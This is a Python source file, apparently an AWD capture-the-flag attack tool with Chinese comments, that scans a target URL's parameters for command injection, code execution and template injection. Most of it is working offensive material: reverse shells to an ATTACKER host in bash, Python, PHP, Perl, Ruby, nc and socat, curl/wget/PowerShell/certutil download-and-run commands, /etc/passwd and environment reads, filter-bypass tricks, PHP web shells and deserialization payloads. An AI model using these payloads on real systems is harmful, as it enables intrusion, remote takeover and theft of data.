#!/usr/bin/env python3
"""
AWD 命令执行/代码执行 Payload 工具
支持: OS 命令注入, 代码执行 (PHP/Python/Ruby/Perl), 绕过过滤
"""

import requests
import re
import sys
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class CommandExecutor:
    def __init__(self, url, method='GET', data=None, headers=None, cookies=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.results = []

    def _send(self, url, data=None):
        try:
            if self.method == 'GET':
                return self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    def _build_url(self, param_name, value):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param_name, value):
        data = dict(self.data)
        data[param_name] = value
        return data

    # ========= 1. 命令注入 Payload 库 =========
    def get_command_injection_payloads(self):
        """返回命令注入 Payload 分类"""
        return {
            'separator': [
                ';id',
                '|id',
                '||id',
                '&id',
                '&&id',
                '`id`',
                '$(id)',
                'id;',
            ],
            'linux': [
                ';id',
                ';uname -a',
                ';cat /etc/passwd',
                ';ls -la',
                ';whoami',
                ';hostname',
                ';ifconfig',
                ';netstat -tlnp',
                ';ps aux',
                ';cat /proc/self/environ',
                ';cat /proc/version',
                ';wget http://ATTACKER/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh',
                ';curl http://ATTACKER/shell.sh | bash',
                ';python3 -c "import socket;exec(open(\"/dev/stdin\").read())"',
                ';bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"',
            ],
            'windows': [
                '&whoami',
                '&net user',
                '&netstat -ano',
                '&dir c:\\',
                '&systeminfo',
                '&ipconfig /all',
                '&type c:\\windows\\win.ini',
                '&reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                '&powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER/shell.ps1\')"',
                '&certutil -urlcache -split -f http://ATTACKER/shell.exe C:\\temp\\shell.exe && C:\\temp\\shell.exe',
            ],
            'blind_time': [
                ';sleep 5',
                ';ping -c 5 127.0.0.1',
                ';timeout 5',
                ';sleep 5 && id',
                '; ping -n 5 127.0.0.1',
            ],
            'bypass': [
                # 绕过关键字过滤
                '; /???/id',
                '; /???/c??t /???/p????d',
                '; /b??n/b??sh -c id',
                '; $(echo aWQK | base64 -d)',
                '; `echo aWQK | base64 -d`',
                # 空格绕过
                ';id',
                '; id',
                ';\tid',
                # $PATH 绕过
                ';echo ${PATH:0:1}',
                ';echo ${PATH:0:1}id',
                # 变量拼接
                ';a=/b;b=in;c=/id;$a$b$c',
                # 通配符
                ';l?s /etc/passwd',
                ';cat /etc/pas?wd',
            ],
            'reverse_shell': [
                ';bash -i >& /dev/tcp/ATTACKER/PORT 0>&1',
                ';python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])"',
                ';php -r \'$sock=fsockopen(\"ATTACKER\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'',
                ';perl -e \'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'',
                ';ruby -rsocket -e \'c=TCPSocket.new(\"ATTACKER\",\"PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'',
                ';nc -e /bin/sh ATTACKER PORT',
                ';nc -mk /bin/sh ATTACKER PORT',
                ';socat TCP:ATTACKER:PORT EXEC:/bin/sh',
            ],
        }

    # ========= 2. 代码执行 Payload 库 =========
    def get_code_execution_payloads(self):
        """返回代码执行 Payload"""
        return {
            'php': [
                '<?php system($_GET["cmd"]);?>',
                '<?php eval($_POST["cmd"]);?>',
                '<?php assert($_REQUEST["cmd"]);?>',
                '<?php exec($_GET["cmd"]);?>',
                '<?php passthru($_GET["cmd"]);?>',
                '<?php shell_exec($_GET["cmd"]);?>',
                '<?php include($_GET["page"]);?>',
                '<?php require($_GET["page"]);?>',
                '<?php $_GET["a"]($_GET["b"]);?>',
                '<?php call_user_func($_GET["f"], $_GET["a"]);?>',
                # 一句话木马
                '<?php @eval($_POST["cmd"]);?>',
                '<?php @assert($_POST["cmd"]);?>',
                '<?php system($_REQUEST["cmd"]);?>',
                '<?php echo "<pre>";system($_GET["cmd"]);echo "</pre>";?>',
                # 加密
                '<?php $a=base64_decode("ZXZhbCgkX1BPU1RbJ2NtZCddKTs=");$a($_POST["cmd"]);?>',
            ],
            'python': [
                '__import__("os").system("id")',
                '__import__("os").popen("id").read()',
                '__import__("subprocess").getoutput("id")',
                'eval(__import__("os").system("id"))',
                'exec("import os;os.system(\'id\')")',
                '__import__("commands").getoutput("id")',
                # pickle 反序列化
                'cpos\nsystem\n(S\'id\'\ntR.',
                # 反弹 Shell
                '__import__("socket,subprocess,os").__dict__',
            ],
            'ruby': [
                '`id`',
                'system("id")',
                'exec("id")',
                'Kernel.system("id")',
                'IO.popen("id").read',
                # 反序列化
                "Marshal.load('---\n- :os\nt:Symbol\n- :system\nt:Symbol\n- id\n')",
            ],
            'perl': [
                'system("id")',
                'exec("id")',
                '`id`',
                'open(FH,"id|");print<FH>;close(FH)',
                'use system("id")',
            ],
            'nodejs': [
                'require("child_process").execSync("id").toString()',
                'require("child_process").execSync("cat /etc/passwd").toString()',
                'process.mainModule.require("child_process").exec("id")',
                'global.process.mainModule.require("child_process").exec("id")',
            ],
            'deserialization_php': [
                # PHP 反序列化 POP 链
                'O:8:"stdClass":1:{s:4:"test";s:2:"id";}',
                'a:2:{s:4:"test";s:2:"id";s:4:"func";s:6:"system";}',
                # 利用 __wakeup / __destruct
                'O:11:"FileHandler":2:{s:9:"*file";s:15:"/var/log/auth.log";s:10:"*callback";s:6:"system";}',
                # Phar 反序列化
                'phar://evil.phar/test.txt',
            ],
        }

    # ========= 3. 检测命令注入 =========
    def detect_command_injection(self):
        """检测命令注入漏洞"""
        print("\n[*] 检测命令注入")

        test_payloads = [
            (';id', 'uid='),
            (';echo "AWD_CMD_OK"', 'AWD_CMD_OK'),
            (';echo AWD_CMD_OK', 'AWD_CMD_OK'),
            ('|id', 'uid='),
            ('||echo AWD_CMD_OK', 'AWD_CMD_OK'),
            ('&echo AWD_CMD_OK', 'AWD_CMD_OK'),
            ('&&echo AWD_CMD_OK', 'AWD_CMD_OK'),
            ('$(echo AWD_CMD_OK)', 'AWD_CMD_OK'),
            ('`echo AWD_CMD_OK`', 'AWD_CMD_OK'),
        ]

        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())

        for param in params:
            for payload, marker in test_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp and marker in resp.text:
                    print(f"  [!!!] 命令注入成功: 参数={param}")
                    print(f"      Payload: {payload}")
                    print(f"      响应片段: {resp.text[:200]}")
                    self.results.append({
                        'type': 'command_injection',
                        'param': param,
                        'payload': payload,
                        'response_preview': resp.text[:300],
                        'severity': 'critical'
                    })
                    return True

        print("  [-] 未发现命令注入")
        return False

    # ========= 4. 检测代码执行 =========
    def detect_code_execution(self):
        """检测代码执行漏洞"""
        print("\n[*] 检测代码执行")

        code_payloads = [
            # PHP 代码执行
            ('<?php echo "AWD_CODE_OK";?>', 'AWD_CODE_OK'),
            ('<?php system("id");?>', 'uid='),
            ('<?php echo "<pre>";system("id");?>', 'uid='),
            ('<?php eval($_GET["cmd"]);?>', 'eval'),
            # Python 代码执行
            ('__import__("os").system("echo AWD_CODE_OK")', 'AWD_CODE_OK'),
            ('__import__("os").popen("id").read()', 'uid='),
            # 模板注入 (SSTI)
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('<%=7*7%>', '49'),
            ('{{config}}', 'config'),
            ('${T(java.lang.Runtime).getRuntime().exec("id")}', 'Runtime'),
            # eval 注入
            ('eval("echo AWD_CODE_OK")', 'AWD_CODE_OK'),
            ('assert("system(\'id\')")', 'uid='),
            ('exec("id")', 'uid='),
        ]

        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())

        for param in params:
            for payload, marker in code_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp and marker in resp.text:
                    print(f"  [!!!] 代码执行成功: 参数={param}")
                    print(f"      Payload: {payload[:80]}")
                    self.results.append({
                        'type': 'code_execution',
                        'param': param,
                        'payload': payload,
                        'severity': 'critical'
                    })
                    return True

        print("  [-] 未发现代码执行")
        return False

    # ========= 5. 盲注 (时间盲注命令执行) =========
    def detect_blind_command_injection(self):
        """检测时间盲注命令执行"""
        print("\n[*] 检测时间盲注命令执行")

        import time
        blind_payloads = [
            ';sleep 3',
            ';ping -c 3 127.0.0.1',
            ';timeout 3',
            '&&sleep 3',
            '|sleep 3',
            ';if(1=1,sleep(3),0)',
            ';$(sleep 3)',
        ]

        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())

        for param in params:
            for payload in blind_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    start = time.time()
                    resp = self._send(test_url)
                    elapsed = time.time() - start
                else:
                    test_data = self._build_data(param, payload)
                    start = time.time()
                    resp = self._send(self.url, test_data)
                    elapsed = time.time() - start

                if elapsed >= 3:
                    print(f"  [!!!] 时间盲注命令执行: 参数={param} 耗时={elapsed:.2f}s")
                    self.results.append({
                        'type': 'blind_command_injection',
                        'param': param,
                        'payload': payload,
                        'elapsed': elapsed,
                        'severity': 'high'
                    })
                    return True

        print("  [-] 未发现时间盲注命令执行")
        return False

    # ========= 6. 完整攻击流程 =========
    def full_scan(self):
        """执行完整命令/代码执行扫描"""
        print("="*60)
        print("  AWD 命令执行/代码执行工具")
        print("="*60)
        print(f"目标: {self.url}")

        self.detect_command_injection()
        self.detect_code_execution()
        self.detect_blind_command_injection()

        # 结果汇总
        print("\n" + "="*60)
        print("  扫描结果")
        print("="*60)
        if self.results:
            for r in self.results:
                print(f"  [{r.get('severity','info')}] {r.get('type','')} - {r.get('param','')}")
                if 'payload' in r:
                    print(f"    Payload: {r['payload'][:80]}")
        else:
            print("  未发现命令/代码执行漏洞")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 command_exec.py <url>")
        print("  python3 command_exec.py <url> --post 'param1=val1'")
        sys.exit(1)

    url = sys.argv[1]
    method = 'GET'
    data = {}

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--post' and i + 1 < len(sys.argv):
            method = 'POST'
            for pair in sys.argv[i+1].split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    data[k] = v
            i += 2
        else:
            i += 1

    executor = CommandExecutor(url, method=method, data=data)
    executor.full_scan()
